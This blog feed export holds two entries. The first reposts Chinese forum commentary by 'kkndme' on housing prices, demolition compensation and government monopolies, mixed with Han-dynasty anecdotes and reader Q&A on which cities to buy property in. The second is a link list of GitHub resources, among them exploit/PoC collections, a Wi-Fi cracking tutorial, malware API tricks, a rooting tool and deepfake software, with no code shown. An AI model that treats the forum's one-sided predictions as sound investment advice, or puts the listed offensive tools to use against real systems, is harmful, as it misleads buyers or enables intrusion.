<p>中国的房地产业本质上已经不是一种行业，像中国大陆的税收与垄断行业的垄断价格一样，成了少数人剥夺多数人财富的一种工具。在这个工具上，寄生着很多食利者。这个食物链的最上层为地方政府，地方政府通过卖地与房地产税收，养着一大批高薪的公务员及满足他们的奢侈需求。食物链的第二层为与官员勾结的房地产商以及受贿吃回扣的官员，第三层是炒房者，炒房者相当部分为拥有大量现金的官员及家属。</p>
<p>市场经济的泡沫会破裂的，但中国的房地产不是市场经济，房地产价格也不是“泡沫”，所以它也不会破裂。中国的房地产价格被政府严格操控着，不说是操控自如，也是有绝对的控制力。因为政府掌控着土地银行汇率等房地产的关键要素。中国的高税收是泡沫吗？中国的垄断行业的高垄断价格如水价电价油价是泡沫吗？当然不是，他们是转移财富的手段。中国的房地产价格也是一种变相的“税收与垄断价格”，其“税率”与“垄断价格”是政府控制的。这也解释了为何中国几年来房价如此之高，却不下跌，所谓“泡沫”却不破裂的原因。</p>
<p>中国房地产的所谓“泡沫”会“破裂”吗？会，只要政府愿意。中国的房地产的“泡沫”会不破裂吗？会，只要政府愿意。</p>
<p>其实，中国所有的问题都是政治问题，而不是经济问题，离开政治谈经济，永远找不到问题的答案。</p>
<h2 id="拆迁补偿-1"><a href="#拆迁补偿-1" class="headerlink" title="拆迁补偿"></a>拆迁补偿</h2><p>拆迁补偿的两种方式：1、现金补偿；2、回迁安置。<br>在二三线及以下城市，通常采用第二种，因为多数开发商没有钱现金补偿，房地产开发基本上是靠zf关系，空手套白狼，就是有钱也不愿意拿出来。<br>对于拆迁户来说，现金补偿也不划算，因为补偿的现金在与原地同级别的位置肯定是买不了相同面积的住房的，所以多数拆迁户选择回迁安置。<br>但是越小的城市开发新盘的速度越慢，往往回迁房盖个三五年也不见得盖得起来。在这期间，开发商会按月补偿拆迁户一定的租金，用于过渡。<br>手里现金多的拆迁户会先买房住，慢慢等拆迁，但是现金不多的拆迁户，就不得不拿着开发商的过渡款租房住。通常这笔过渡款都要高于相同位置的租金，所以拆迁户就把房租炒起来了。</p>
<p>北京已经没有原地回迁的说法了，一线城市，还有部分较发达的二线城市都不搞原地回迁了，土著一旦拆迁了就赶到郊区。反而是二、三线城市，特别是三线以下城市多数还在搞原地回迁。主要原因是城市小，住户多多少少都有些背景，特别是单位的老公房，开发商不让原地回迁，根本就拆不动，阻力太大。</p>
<p>房子从拆到迁是有时间的，快的情况是1年多，但很多情况都是拆迁安置房3,4年盖不起来。比如昆明的莲花池片区，大概是06年左右拆迁的，但拆迁安置房现在才开始动工，2012年才盖的起来。这种事情并不是个案。<br>贵州更离谱，房子04年拆了就再也没有音讯，开发商一直盖不起来，到现在都6年了。原来的拆迁户，现在还在租房住。</p>
<h2 id="城市底层"><a href="#城市底层" class="headerlink" title="城市底层"></a>城市底层</h2><p><strong>游泳横渡马六甲：</strong></p>
<p>经常有人说收入是决定因素，其实人均收入没有意义。北京姑娘去外企做前台一个月2000，和公司外地姑娘拿这么多，和做公务员的外地姑娘拿这些，生活成本天差地远。不是说有10万个月入2000的外来人口，四环内就有一万处他们能承受的住房。而个体的外来人口的支出，会随着生活成本调整。开始很难理解月入两三千的白领在北京市如何生活，毕竟他们不可能像楼下卖蔬菜水果的大叔那样，炖点猪肉粉条就算开荤，穿特价五块的汗衫就算工作服。一样的月入，白领的幸福起点高得多。后来知道他们原先偶尔用兰蔻改成一直用大宝，早餐不再喝豆浆，住单位附近的搬到五环外，有人在燕郊买了房……突然想起小时候学新概念英语，说起蓝领工资比白领高，但还有人为了能西装革履宁可减薪做白领。</p>
<p>对80后而言，最恐怖的绝不是房价，而是养老。这也不是计生的问题，一个社会的生活资源是有限的，老龄化早晚会到来，为了改变老龄化呼吁多生育，那是饮鸩止渴。等多生出来这部分老了，再这么循环？而福利社会如英国是50多岁的人最幸福，有稳定养老金，二三十岁最痛苦，看不到未来依靠。家底不厚的像希腊，透支做社会福利，后果还不如不做。中国则是取不足以奉有余，竭全民之力供特权阶层挥霍，没有哪个年龄段享受过全民福利，还得共同面对养老难题。房子，真不算此生最纠结的事</p>
<p><strong>kkndme：</strong></p>
<p>正是如此，以后城市的底层吃饭都是问题，zf最喜欢拿房子说事转移矛盾</p>
<h2 id="垄断企业"><a href="#垄断企业" class="headerlink" title="垄断企业"></a>垄断企业</h2><p>我们的垄断企业其实都是第二税务局的角色，比如石油、移动、电力、水务、地产、银行等等。zf一定要掏空百姓的钱包，所以说什么泡沫不泡沫，就是个笑话</p>
<h2 id="农村自来水"><a href="#农村自来水" class="headerlink" title="农村自来水"></a>农村自来水</h2><p>说起农村建自来水更搞笑，亲眼目睹要不然真不敢相信。<br>贵州有个村子，以前，自来水是村子集体出钱买的管子，然后全村出劳力从山上接下来（用的山泉水），要是水管坏了，大家再摊钱摊劳动力修。<br>结果zf不愿意了，说他们修的不规范，zf给重新修，还是从山泉引水下来，zf包给工程队换了一下管子，然后每户给按了水表，安好了以后，要按照2块钱一吨收费，全村都炸了窝了，集体抗议，现在还没有结果。</p>
<h2 id="袁盎"><a href="#袁盎" class="headerlink" title="袁盎"></a>袁盎</h2><p>丛林社会就是要承认人与人之间的差别，性格决定命运。<br>我要讲一个奇人，这个人叫袁盎。故事的出处是《史记·袁盎晁错列传》，如果鸡冻同志认为我瞎编，可以自己去看原文。</p>
<p>袁盎同志的神奇是一般人都无法想象的，这个奇人在吴国当相国的时候，他手下的一个小公务员跟老袁同志的爱妾乱搞，经常背着老袁嘿咻嘿咻。老袁知道了这个事就装聋作哑。<br>有人跟那个小公务员说:坏了，你跟袁领导的二奶私通的事让袁领导知道了，你死定了。<br>小公务员一听吓坏了，骑了马就跑，公务员这份全世界最令人羡慕的工作也不要了。<br>小公务员一跑，袁领导就使劲追，小公务员就更拼命跑，袁领导就更拼命追。袁领导的马要好一点，跑的快，终于把小公务员追上了。小公务员只好下马等死。<br>袁领导急了，对小公务员说：你跑什么呀？我正打算把我的二奶送给你。兄弟如手足，妻子如衣服。大概就是这个意思。<br>小公务员感激涕零，抱着袁领导的二奶继续嘿咻。<br>所以说老袁这人最仗义，人缘最好。上下都买他的帐。</p>
<p>老袁也有个把敌人。老袁在皇宫里当小跟班的时候，得罪了汉文帝宠爱的一个太监叫赵谈的，所以特别害怕，怕赵太监哪天找茬把自己给黑了。<br>老袁征求了侄子的意见，认为自己应该先下手为强，应该当众侮辱一下赵太监，这样如果赵太监再黑自己，就没人信了，别人都以为是公报私仇。老袁的政治手腕还是相当高的。<br>一天，文帝刘恒跟找太监坐在一辆车子里外出，老袁上前拦住车子，大义凛然的说：能够跟天子共乘一车的，都是天下豪杰，天子怎么能跟一个没小鸡鸡的人坐一辆车呢？<br>赵太监当场就气哭了，还不能说什么。以后赵太监要黑老袁，也没那么容易了，因为大家都知道老袁义正言辞，充满正义的得罪了赵太监，如果赵太监再说老袁坏话，就是公报私仇。</p>
<p>老袁的人缘是公认的好，但是在朝里有一个最大的敌人，就是大名鼎鼎的晁错。<br>晁错这个人学的是商鞅之术，法家的代表人物。为人冷酷，不讲人情，人缘特别差。老袁和晁错关系不好，可能跟两个人的性格很有关系。<br>晁错跟贾谊很有一拼，特别喜欢喷，口才也特别好，跟贾谊同志喷的内容也差不多，一会儿说打匈奴其实很简单啦，一会儿说必须削藩啦。刘恒听晁错喷的很有水平，很欣赏，但是刘恒不是傻子。<br>打匈奴？那得是国力强大以后的事，现在必须让老百姓修养生息。<br>削藩？我也想削藩，但是总得有合适时机才行啊，现在削藩不是逼人造反吗？<br>刘恒对晁错这种人的态度就是，你建议你的，我听听就可以了，不能当真。</p>
<p>晁错同志懂得要想发达，必须选择一个有前途的职业，所以凭着他气死保险推销员的口才，当上太子的老师。这个太子就是汉景帝刘启。<br>晁错的时代终于来了，原因是刘恒挂掉了。<br>刘启生下来就是锦衣玉食，可没他老子那两下子，也不怎么懂帝王之术，晁错说什么就是什么。<br>晁错于是抖起来了，不知姓什么了，仗着是皇帝的老师，飞扬跋扈，人缘极差。晁老师最爱追求政绩，立刻提出削藩。<br>削藩的结果就是吴楚七国反了。<br>这个故事跟明代朱允文同志的削藩如出一辙。明朝朱允文同志削藩的结果就是朱棣反了，当了皇帝。朱允文被迫流浪，泡吉普赛美眉去了。<br>吴王不是朱棣，性格有点象袁绍，生性多疑，手下有人才不会用，所以没能成大事，被周亚夫跟干掉了。如果吴王能有朱棣的本事，汉朝的历史就会改写。</p>
<p>吴王一反，老袁就着急了。老袁给吴国当过相国，吴王造了反，晁错必然要借机宰了老袁，老袁觉得自己冤枉啊，吴王造反不是你晁错逼的吗？<br>晁错果然趁机对老袁打击报复，安排了两个手下去弹劾老袁。但是晁错的人缘实在太差了，老袁的人缘实在太好了，那两个手下竟然不同意弹劾老袁。而且还劝晁错,大意是：现在七国兵马造反了，形式很危急，我们还搞内斗就不好了。老袁这个人是不可能参与谋反的。<br>晁错也着急叛乱的事，就把老袁放一边了。政治斗争，不是你死就是我活。<br>晁错错了，赔进了自己的老命。<br>窦婴同学也曾经在吴国当过相国，立刻跟老袁站在了一条战线上，准备给晁错来个致命一击。<br>晁错这个人的死，完全是他自己性格造成的，对人苛刻，政治上又是白痴。吴楚七国打着“诛晁错，清君侧”的名义造反，皇帝问晁错应该怎么办?<br>晁错的白痴精神充分发挥了出来，“陛下您御驾亲征，臣留守长安，做好看家的工作。”<br>皇帝估计当时心里要多愤怒有多愤怒。你自己惹的祸，你一个当臣子的在家躲起来，让我当天子的上去当炮灰，你是何居心? 不过刘启涵养好，没说出来。<br>这时候老袁跑了进来，说有平乱之计，要单独跟皇帝说。刘启很不客气的就把晁老师请了出去。<br>老袁立刻献计，既然反叛打着清君侧的名义，就先把晁老师宰了，叛军就出师无名了，就得不到老百姓的响应，事情就好办了。<br>刘启一听挺高兴，正恨晁老师让自己当炮灰的事呢，立刻同意，腰斩晁错。<br>晁错的下场要比贾谊惨多了。</p>
<p>不过老袁的下场也并不好。皇帝的老妈想让皇帝的弟弟梁王在刘启驾崩后继承皇帝这份工作，但是老袁不同意，坚决表示反对，得罪了梁王。<br>梁王不是一般的高级公务员，最喜欢搞黑社会，找了杀手把老袁干掉了。<br>这个故事又告诉我们，即使人缘再好，在政治斗争中活下来也是不容易的。</p>
<p>我说的不是袁盎也不是晁错，说的是削藩，皇帝削藩怎么样？看看朱允文的下场，晁错几乎独揽了大权，削藩的下场是什么？腰斩。清查空置率，zf不参与一级开发，不是扯淡吗？</p>
<h2 id="二三线城市，选新城还是老城"><a href="#二三线城市，选新城还是老城" class="headerlink" title="二三线城市，选新城还是老城"></a>二三线城市，选新城还是老城</h2><p><strong>wofuleyumin1：</strong></p>
<p>楼主 我又有问题了。。。。请务必回答 谢谢</p>
<p>1。目前很多城市开发新城 我们主要谈二三线城市吧。。。这些地方的新城会超越老城吗？ 我们投资该投新城还是老城？</p>
<p>比如成都 南边的天府新城，口号国际城南。。</p>
<p>2。投资一定投越靠市中心越好吗？ 比如成都，西三环是比东二环还好。。但未来2环是否最终比3环好？</p>
<p><strong>kkndme：</strong></p>
<p>拆迁是块硬骨头，不够铁腕的领导会避开破旧但繁华的老城区的问题，转而开发新城，所以往往形成倒挂，即新城一下子变成了新贵聚居区，新城的房价甚至高过老城区。 但这是一种倒挂，老城升级改造是必然的一步棋，只是时间的早晚。未来老城区的升级改造，老城区的价值就会凸显，价格要远远高于新城。</p>
<p>但是老城区的多数老房子都可能面临拆迁，投资老城区的老房子不见得划算，特别是二三线城市的拆迁，离皇帝越远的城市，争取合理补偿越困难。</p>
<h2 id="在中国，普通人手上闲钱不多的人被剥削"><a href="#在中国，普通人手上闲钱不多的人被剥削" class="headerlink" title="在中国，普通人手上闲钱不多的人被剥削"></a>在中国，普通人手上闲钱不多的人被剥削</h2><p><strong>抽着雪茄喝着绿茶：</strong></p>
<p>兰州，我近来盛干人民币的贬值力度之强烈<br>现在手上还有十万的盈余<br>做什么好呢<br>咬紧牙关供一套房？买黄金？还是买车呢？<br>总之不能空放着，<br>这样通货膨胀下去，汽车的价格也会涨吗？</p>
<p><strong>kkndme：</strong></p>
<p>买车是消费，不是投资，如果追求享受，可以买车，但不能保值增值。汽车属于工业品，通过扩大生产规模可以使边际成本下降，所以汽车会因为档次的不同有涨有跌。<br>黄金可以适当配置，但由于黄金的定价权不在国内，所以买黄金有一定的风险。<br>十几万买房子估计不够首付，除非特别小的城市。但小城市的房产变现起来比较麻烦。<br>至于古玩字画茅台酒之类的，真假难辨，不是专家很难参与投资，且一般人变现还是很困难的。<br>所以资金越小，资金实现保值增值越困难。我国实行的高通胀低利率政策，是对手中闲钱不多的普通群众赤裸裸的剥削。而手中闲钱较多的中产阶层，相对好一点，可以投资住宅商铺进行保值增值。</p>
<h2 id="三分天注定，七分靠打拼"><a href="#三分天注定，七分靠打拼" class="headerlink" title="三分天注定，七分靠打拼"></a>三分天注定，七分靠打拼</h2><p><strong>汝爱之罪：</strong></p>
<p>从晁错的上位过程可以看出，口才很重要</p>
<p><strong>kkndme：</strong></p>
<p>呵呵，这个也不一定，一个是看老板的风格，一个是看自身的运气。<br>说汉文帝刘恒去参观皇家动物园（上林苑）就问动物园园长：“咱们动物园有多少动物啊，都有什么品种啊？”一下子把园长问晕了，吭吭叽叽答不上来。<br>这时有个负责老虎的工作人员跑了出来，作了一通汇报，如数家珍，回答的头头是道。刘恒特别高兴，觉得这个管理老虎的工作人员口才特别好，想提拔他当动物园园长。<br>这时候张释之蹦了出来，对皇帝说：秦朝的时候，赵高口才就特别好，特别巧言善辩，结果忠厚的大臣都被迫害了，天下大乱，秦朝完蛋了。陛下要是提拔这个管理大老虎的人，恐怕所有的大臣都会效仿他，专门学习卡耐基演讲，并且天天琢磨吹牛拍马，就没人真正为皇帝干活了。<br>结果是可怜的管理老虎的工作人员白高兴了一场，不但没得到奖赏，还得罪了动物园园长。</p>
<h2 id="人的前程有的时候不掌握在自己手里"><a href="#人的前程有的时候不掌握在自己手里" class="headerlink" title="人的前程有的时候不掌握在自己手里"></a>人的前程有的时候不掌握在自己手里</h2><p>某城市从外省调来个姓q的一把手。该一把手一上任就把该市原来的骨干公务员全部晾到一边，一概不用，名义上对外宣称的是：领导干部年轻化。提拔了一批没有工作经验刚毕业的博士生当处级干部，大多数30岁还不到。这些人一点工作经验没有，以至于外界都很惊讶，甚至惊动了日本友人。<br>该一把手正是要用这些毫无工作经验的白纸，第一：人是自己一手提拔的，他能不感激涕零吗？第二：这些人啥也不懂，自己想怎么干就怎么干，这些人听话就行。不这样做，怎么能一手遮天呢？<br>一批期望往上爬的老公务员就这样牺牲掉了，而一批新丁就此崛起。人生的前程往往不掌握在自己手里。</p>
<h2 id="河南郑州-与-洛阳"><a href="#河南郑州-与-洛阳" class="headerlink" title="河南郑州 与 洛阳"></a>河南郑州 与 洛阳</h2><p><strong>scdf1234：</strong></p>
<p>楼主，我想咨询一下，像洛阳这样的城市，它的经济在河南是第二位，但又离省会郑州很近，洛阳的房价现在大概是四千多，您认为洛阳的房价上涨的空间大吗？<br>谢谢！！！！！！！！！！！！</p>
<p><strong>kkndme：</strong></p>
<p>洛阳只能成为郑州的影子，如果自住，趁早在洛阳买房，以后一定会涨，如果投资，还是在郑州买，郑州的上涨空间，肯定大于洛阳。<br>不过95年以后，我就再也没去过洛阳，所以洛阳买哪个楼盘升值快，你得自己仔细研究。</p>
<h2 id="杭州"><a href="#杭州" class="headerlink" title="杭州"></a>杭州</h2><p><strong>灵魂被枪决：</strong></p>
<p>不知道楼主还在不在，因为只看完前面几页。</p>
<p>我前两天刚定了一套二手房，昨天打了首付款，下星期应该就要办银行按揭手续了。</p>
<p>我一直很想买房，但我LG一直不愿意买房，就在定下这套房子之前他还是很不乐意，但</p>
<p>因为我的坚持，我们终于买了房子了。房子定下后一个石头落地了，但另一个石头有悬</p>
<p>地半空了，因为我们是做个体户生意的，就怕生意有变故贷款接不上（我是个悲观主义</p>
<p>者，总先把最坏情况打算在前）。我们是在杭州，虽然不是市中心，但也算是市区了，</p>
<p>请问楼主能分析一下杭州楼市情况吗？？</p>
<p>先谢过了，楼主的文章对我启发真的很大</p>
<p><strong>kkndme：</strong></p>
<p>前面说过了，杭州我是当一线城市看的。杭州这个城市，本来就是富人的天堂，房价涨到多高都不奇怪，而且极好变现。所以你根本无须担忧资金问题。</p>
<h2 id="西安-与-重庆"><a href="#西安-与-重庆" class="headerlink" title="西安 与 重庆"></a>西安 与 重庆</h2><p><strong>ttan12345：</strong></p>
<p>用了一整天的时间拜读了楼主的精彩文章，很是佩服！</p>
<p>印象最深刻的就是北周宇文式和苏的关于贪官的对答，古人真有高人啊！</p>
<p>感觉楼主知识面相当的宽广，尤其对世界历史比较精通，许多观点非常符合世界发展的规律</p>
<p>关于房产的问题，我也一直认为，最终不是我们小老百姓可以玩的东子，所以能买就</p>
<p>尽早买。看了楼主不止一次给大家推荐去投资西安和重庆的地产，楼主问什么看好西安</p>
<p>和重庆这两个地方，现在各个省会城市哪个不是大兴土木呢？为何西安和重庆会进入你</p>
<p>的法眼？</p>
<p><strong>kkndme：</strong></p>
<p>重庆我就不多说，论述的比较多了，发展重庆是国家战略性的，这是政治任务。<br>西安是西北地区唯一的大城市（乌市比较特殊，不讨论乌市），教育资源丰富，且房价基数较低，所以说后续发展潜力很大，未来该城市的发展一定会纳入zy的视野</p>
<h2 id="谢国中「空置率」"><a href="#谢国中「空置率」" class="headerlink" title="谢国中「空置率」"></a>谢国中「空置率」</h2><p><strong>林语边的鸽子：</strong></p>
<p>谢国中:”一是加息预期；二是政府对房地产的政策调控力度不改；三是市场对人民币升值的预期减弱；四是参考了实际的供应量，“到2012年，房地产的空置率会非常高，全中国13亿老百姓要有的房子都有了。”<br>谢国忠预测，“接下来可能会看到交易量一直在增长，而房价却不死不活地拖几年，房地产没有第二场戏了</p>
<p>请问楼主对谢国中的说法怎么看?<br>谢谢</p>
<p><strong>kkndme：</strong></p>
<p>谢是油价和中国房地产的长期唱空者，从04年开始唱空中国房产。谢的有些话还是很有道理的，但有些预测就另有目的了，毕竟屁股决定脑袋。<br>今年谢一直呼吁的是加息，兼带唱空房地产，唱空房地产的主要依据是空置率。<br>谢自己也说中国的房地产最大受益的是zf，但却用空置率给出了一个下跌的结论。<br>人民币升值，呼吁加息，唱空房地产，摩根史丹利的喉舌作用显而易见的</p>
<h2 id="打工不如有一技之长的小老板"><a href="#打工不如有一技之长的小老板" class="headerlink" title="打工不如有一技之长的小老板"></a>打工不如有一技之长的小老板</h2><p>进不了体制内的，无论是不是大学毕业，凡是有头脑的、懂做生意的，会一技之长的，只要不懒，活的肯定比无特长一般在公司打工的小白领强。<br>古代也是这样的，街面上卖爆肚的肯定比大户人家厨房里负责切葱的日子过的稳当。卖爆肚的小本生意很累很辛苦，但是有个手艺就不会饿肚子。大户人家切葱的上班期间日子过的比较轻松，甚至收入比卖爆肚的还强点，在大户人家也体面些。但一旦大户人家不要切葱的了，裁员了，这个切葱的出来还真没办法养活自己。<br>大学文凭顶多算个秀才资格，有这个资格才有机会举士，但是举不了士的，就必须学点技术，否则收入远远赶不上瓦工、电工。<br>过去的穷秀才，饭都吃不饱，但是社会地位却不差，一旦中了恩科，就是宰相根苗。现在有点不同，进不了体制内，又没点技术，那肯定沦为社会的最底层，不要说买房子了，能不能解决吃饭问题都不一定。</p>
<h2 id="一线、二线的生活"><a href="#一线、二线的生活" class="headerlink" title="一线、二线的生活"></a>一线、二线的生活</h2><p>一线和二线选择哪个城市生活，其实就是围城。<br>在一线打拼，有技术有背景或者机会好的，进了金字塔的中层。对于没背景的，运气差点的，看着没什么希望就离开了，到二线发展，起码二线生活成本还低点。混不下去的离开了，又有大量的打算拼一把的冲进来。<br>很多人宁可在大城市当底层，也不愿意回小城市。这还是个观念问题。小城市从城东走到城西也就二十分钟，觉得过得太枯草。大城市灯红酒绿的，虽然跟自己其实没多大关系，但是看着就是舒服。</p>
<h2 id="房子不属于市场经济（阴谋论的角度）"><a href="#房子不属于市场经济（阴谋论的角度）" class="headerlink" title="房子不属于市场经济（阴谋论的角度）"></a>房子不属于市场经济（阴谋论的角度）</h2><p>不说历史了，讲个故事吧。这个故事纯属虚构，如有雷同，纯属巧合。讲故事麽，就不要和谐了。<br>传说王安石变法失败，后人小王跑到了海外，发现了大西洲。大西洲正处于混乱阶段，军阀割据，外族入侵。小王是个政治军事天才，煽动农民起义，统一了大西洲政权，建立了大西国。<br>小王继承了王安石变法的理想，建立了一个中央高度集权，百姓与百姓之间完全消灭差别的理想国家。农场、工厂、商场全部由国家统一经营，老百姓只需要在国家的农场、工厂、商场里快乐打工就行了。老百姓穿一样的，吃一样的，连结婚都是国家给安排。<br>大西国里有的知识分子认为这样治理国家太机器化了，有违人性。小王同志对这些知识分子很生气。<br>遥远的东方，有一个白鹿洞书院，书院的院长是个伟大的导师，这个人叫朱熹，此人提出了存天理、灭人欲的理论，给了小王同志治理国家理论上的支持。<br>于是小王同志大搞禁欲主义，凡是学习过陆九渊、王阳明心学理论的都抓起来改造。</p>
<p>不久，大西国经营的农场、工厂、商场就出了问题。效率特别低，老百姓出工不出力，胡干蛮干的比比皆是，后来出现了大饥荒，饿死了不少人。小王同志干不下去，被人赶走了。<br>新领导上台后，先把农场划分给农民，提高农民的积极性，先解决粮食问题。但是工厂、商场就比较不好办。<br>新领导认为，工厂、商场效益低，赔钱是因为负担太重了，城市里的老百姓生老病死都是由国家的工厂、商场负责，国家哪里管的起呢？<br>于是新领导就提出给国家的企业减负，给点优惠政策，拿出胡萝卜，让胆子大愿意自己单干的同志们主动离开国家企业。对于很多死活不肯走的同志，新领导强令这些人卷铺盖，国家不再负担这些人的生老病死了。大家自己解决吧，国家不管了。<br>新领导把还留在国家企业的自己人，定义为内部人员。离开国家企业的，就是外人，定义为社会闲杂人等。<br>社会闲杂人等，有人欢喜有人忧。有人利用内部人员的关系，大把赚钱，有人跑去给外国人当洋买办赚的也不少，还有的知识分子凭着有点文化，给人打工生活的也不错，反正这些人都挺高兴，比在内部受穷强。当然也有没本事的，就比较惨，生活的比较困难。</p>
<p>新领导看见内部都是自己人了，闲杂人等都清理掉了，于是着手内部改革，凡是稀缺的，与老百姓生产生活密切相关的行业，都由内部来经营，不需要动脑子搞创新，只要定个价，老百姓就必须得接受。<br>而需要创新动脑子的产业，不具备稀缺性必须充分竞争的产业，不是跟老百姓生产生活密切相关的产业都交给社会闲杂人等去自由竞争。<br>相当于把肉都留给了内部自己，把骨头扔给了外部闲杂人员。<br>这样做还有个好处：新领导喜欢内部自己人直接跟外国人做生意，但是只要跟外国人做生意就赔钱，赔的还不是一点半点。赔的钱从哪里补呢？<br>只要通过内部自己人经营的企业，抬高定价，将赔掉的钱转嫁给社会闲杂人等就可以了。<br>于是，当初离开内部的社会闲杂人等发现，钱也难赚了，生活成本也越来越高了，日子过得变得越来越艰难了。<br>这时有个傻空跳出来说：我就不信了，市场经济没有只涨不跌的商品。房价肯定会跌。<br>有个明白人告诉他：市场经济是分品种的。外部社会闲杂人等经营的电脑、电视是市场经济。但是内部人经营的石油、房地产不是市场经济。不能拿市场经济来解释。<br>这个傻空不信，本来在大西国能买房的，结果一直没买，后来买不起了，只好一直租房住。但是房租老涨价，吃饭越来越困难，一年难得吃两回肉。</p>
<h2 id="什么是好的政策"><a href="#什么是好的政策" class="headerlink" title="什么是好的政策"></a>什么是好的政策</h2><p>好的政策就象挂在驴子鼻子上的胡萝卜，让人永远有希望，但是拼命追也吃不到。这就是中国政治家的最高智慧。</p>
<p>洋人进北京，老佛爷把义和团推出来，结果拳匪搞的鸡飞狗跳，没法收场。<br>保钓也打算发动群众，靠爱国激情转嫁矛盾。不过好像这招不灵了。老板怎么对待员工，员工就会怎么回报老板。</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>非技术转贴</tag>
      </tags>
  </entry>
  <entry>
    <title>学习资源</title>
    <url>/2020/12/29/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/</url>
    <content><![CDATA[<p><a href="https://github.com/bkerler/exploit_me">exploit_me</a> - Very vulnerable ARM&#x2F;AARCH64 application (CTF style exploitation tutorial with 14 vulnerability techniques).</p>
<p><a href="https://github.com/citra-emu/dynarmic-android">dynarmic-android</a> - A dynamic recompiler for ARM.</p>
<p><a href="https://github.com/0wlsec/Poc-Exp">Poc-Exp</a> - 记录在漏洞研究过程中编写的 PoC&#x2F;Exp.</p>
<p><a href="https://github.com/shining1984/PL-Compiler-Resource">PL-Compiler-Resource</a> - 程序语言与编译技术相关资料（持续更新中）.</p>
<p><a href="https://github.com/vulhub/vulhub">vulhub</a> - Pre-Built Vulnerable Environments Based on Docker-Compose.</p>
<p><a href="https://github.com/ashwio/arm64-hypervisor-tutorial">arm64-hypervisor-tutorial</a> - arm64-hypervisor-tutorial.</p>
<p><a href="https://github.com/ultraji/linux-0.12">linux-0.12</a> - 《Linux内核完全剖析》linux0.12源码及实验环境.</p>
<p><a href="https://firmianay.gitbook.io/ctf-all-in-one/">ctf-all-in-one</a> - ctf-all-in-one.</p>
<p><a href="https://github.com/Apress/modern-arm-assembly-language-programming">modern-arm-assembly-language-programming</a> -Source Code for ‘Modern Arm Assembly Language Programming’ by Daniel Kusswurm。</p>
<p><a href="https://github.com/mytechnotalent/Reverse-Engineering-Tutorial">Reverse-Engineering-Tutorial</a> - A comprehensive reverse engineering tutorial covering x86, x64, 32-bit ARM &amp; 64-bit ARM architectures.</p>
<p><a href="https://github.com/RangerNJU/Static-Program-Analysis-Book">Static-Program-Analysis-Book</a> - Getting started with static program analysis. 静态程序分析入门教程。</p>
<p><a href="https://github.com/hongriSec/Web-Security-Attack">Web-Security-Attack</a> - Web安全相关内容.</p>
<p><a href="https://github.com/PacktPublishing/Ghidra-Software-Reverse-Engineering-for-Beginners">Ghidra-Software-Reverse-Engineering-for-Beginners</a> - Software Reverse Engineering with Ghidra, published by Packt.</p>
<p><a href="https://github.com/nas5w/100-days-of-code-frontend">100-days-of-code-frontend</a> - Curriculum for learning front-end development during #100DaysOfCode.</p>
<p><a href="https://github.com/iromise/fans">fans</a> - FANS: Fuzzing Android Native System Services.</p>
<p><a href="https://github.com/rabbitstack/fibratus">fibratus</a> - A modern tool for the Windows kernel exploration and tracing.</p>
<p><a href="https://github.com/ydf0509/python36patterns">python36patterns</a> - 最全python36种设计模式。</p>
<p><a href="https://github.com/alexMyG/AndroPyTool">AndroPyTool</a> - A framework for automated extraction of static and dynamic features from Android applications.</p>
<p><a href="https://github.com/den4uk/andriller">andriller forensic tools</a> - Andriller - is software utility with a collection of forensic tools for smartphones. </p>
<p><a href="https://github.com/topjohnwu/Magisk">Magisk</a> - The Magic Mask for Android.</p>
<p><a href="https://github.com/opengapps">The Open Google Apps Project</a> - The Open Google Apps Project.</p>
<p><a href="https://github.com/ElderDrivers">ElderDrivers</a> - An Android third-party xposed framework.</p>
<p><a href="https://github.com/applicazza/JNIDA">JNIDA</a> - Helps to rename JNI native methods and restore their C signatures.</p>
<p><a href="https://bbs.pediy.com/thread-260965.htm">关于抓包的碎碎念</a> - 关于抓包的碎碎念.</p>
<p><a href="https://bbs.pediy.com/thread-251370.htm">没有WIFI利用USB抓https包</a> - 没有WIFI利用USB抓https包.</p>
<p><a href="https://github.com/bkerler/android_universal">通用android引导到root</a></p>
<p><a href="https://github.com/darvincisec/DetectFrida">DetectFrida</a> - Detect Frida for Android</p>
<p><a href="https://github.com/xrkk/awesome-ida">awesome-ida</a> - awesome-ida.</p>
<p><a href="https://github.com/alphaSeclab/awesome-reverse-engineering">awesome-reverse-engineering</a> - awesome-reverse-engineering.</p>
<p><a href="https://github.com/HongxuChen/awesome-llvm">awesome-llvm</a> - awesome-llvm.</p>
<p><a href="https://github.com/CrackerCat/javaweb-sec">javaweb-sec</a> - 攻击Java Web应用-[Java Web安全].</p>
<p><a href="https://github.com/heibaiying/BigData-Notes">大数据入门指南</a> - 大数据入门指南.</p>
<p><a href="https://github.com/hadesangel/MITRE-ATT-CK-CN">MITRE-ATT-CK-CN</a> - MITRE-ATT-CK-CN.</p>
<p><a href="https://github.com/mitmproxy">mitmproxy</a> - mitmproxy.</p>
<p><a href="https://github.com/vaexio/vaex">Vaex</a>  - Vaex is a python library for lazy Out-of-Core DataFrames.</p>
<p><a href="https://github.com/arieljt/VTCodeSimilarity-YaraGen">VTCodeSimilarity-YaraGen</a> -  Yara rule generator using VirusTotal code similarity feature code-similar-to.</p>
<p><a href="https://github.com/Xu-Jian/Wifi-Crack">Wifi-Crack</a> - Wifi 破解实战详解.</p>
<p><a href="https://github.com/icedland/iced">iced</a> - High performance and correct x86&#x2F;x64 disassembler, assembler, decoder, encoder for .NET, Rust, Python, JavaScript.</p>
<p><a href="https://github.com/Fklearn">Fklearn</a> - 各种有用的项目。</p>
<p><a href="https://github.com/PaddlePaddle/PaddleOCR">PaddleOCR</a> - PaddleOCR旨在打造一套丰富、领先、且实用的OCR工具库，助力使用者训练出更好的模型，并应用落地。</p>
<p><a href="https://github.com/deepfakes/faceswap">faceswap</a> - Deepfakes Software For All.</p>
<p><a href="https://github.com/JaidedAI/EasyOCR">EasyOCR</a>- Ready-to-use OCR with 80+ supported languages.</p>
<p><a href="https://github.com/hantmac/Mastering_Go_ZH_CN">Mastering_Go_ZH_CN</a> - 《Mastering GO》中文译本，《玩转 GO》。</p>
<p><a href="https://github.com/vxunderground/WinAPI-Tricks">WinAPI-Tricks</a> - Collection of various WINAPI tricks &#x2F; features used or abused by Malware.</p>
<p><a href="https://github.com/iggredible/Learn-Vim">Learn-Vim</a> - Learning Vim and Vimscript doesn’t have to be hard. This is the guide that you’re looking for.</p>
<p><a href="https://github.com/budtmo/docker-android">docker-android</a> - About Android in docker solution with noVNC supported and video recording.</p>
